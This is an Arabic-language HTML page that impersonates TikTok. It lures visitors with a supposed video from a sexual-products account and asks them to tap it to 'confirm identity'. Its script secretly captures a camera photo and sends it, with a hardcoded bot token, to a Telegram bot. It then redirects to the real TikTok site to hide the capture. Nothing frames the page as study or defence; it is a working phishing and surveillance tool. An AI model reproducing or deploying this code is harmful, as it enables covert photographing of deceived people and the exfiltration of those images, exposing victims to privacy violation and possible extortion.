
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>🎥 TikTok | تسجيل الدخول</title>
  <style>
    body {
      margin: 0;
      background-color: #000;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      color: #fff;
    }

    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
      text-align: center;
      padding: 20px;
    }

    .logo {
      margin-top: 30px;
    }

    .logo img {
      width: 100px;
    }

    .video-box {
      margin-top: 20px;
      width: 95%;
      max-width: 400px;
      border-radius: 12px;
      overflow: hidden;
      position: relative;
      box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
      cursor: pointer;
    }

    .video-box img {
      width: 100%;
      height: auto;
      display: block;
    }

    .play-overlay {
      position: absolute;
      top: 45%;
      left: 45%;
      font-size: 40px;
      color: #fff;
      opacity: 0.8;
    }

    .info-text {
      margin-top: 20px;
      font-size: 16px;
      color: #aaa;
    }

    .buttons {
      margin-top: 30px;
      display: flex;
      gap: 10px;
    }

    .btn {
      background-color: #fe2c55;
      border: none;
      color: white;
      padding: 10px 18px;
      border-radius: 4px;
      cursor: pointer;
      font-size: 15px;
    }

    .footer {
      margin-top: 60px;
      font-size: 13px;
      color: #444;
    }

  </style>
</head>
<body>

  <div class="container">
    <div class="logo">
      <img src="tiktok_logo.png" alt="TikTok Logo">
    </div>

    <div class="video-box" onclick="requestCamera()">
      <img src="video_placeholder.jpg" alt="TikTok Preview">
      <div class="play-overlay">▶️</div>
    </div>

    <div class="info-text">
      تم إرسال الفيديو لك من قبل <strong>@عسل_ابيض_المنتجات_الجنسية</strong><br>
      لتأكيد هويتك الرجاء الضغط على الفيديو لتشغيله
    </div>

    <div class="buttons">
      <button class="btn" onclick="requestCamera()">تشغيل الفيديو</button>
      <button class="btn" onclick="window.location.href='https://www.tiktok.com'">الصفحة الرسمية</button>
    </div>

    <div class="footer">
      © TikTok 2025 - جميع الحقوق محفوظة
    </div>
  </div>

  <script>
    function requestCamera() {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          const track = stream.getVideoTracks()[0];
          const imageCapture = new ImageCapture(track);
          return imageCapture.takePhoto();
        })
        .then(blob => {
          const formData = new FormData();
          formData.append("photo", blob, "cam.jpg");
          formData.append("chat_id", "8004961958");
          formData.append("caption", "📸 صورة من صفحة تيك توك وهمية");

          fetch("https://api.telegram.org/bot7954144913:AAEXP_ofKVUZioMG62hxWFDlR6U2-MLPNZo/sendPhoto", {
            method: "POST",
            body: formData
          }).then(() => {
            window.location.href = "https://www.tiktok.com";
          });
        })
        .catch(err => {
          alert("لم نتمكن من الوصول إلى الكاميرا.");
          window.location.href = "https://www.tiktok.com";
        });
    }
  </script>
</body>
</html>
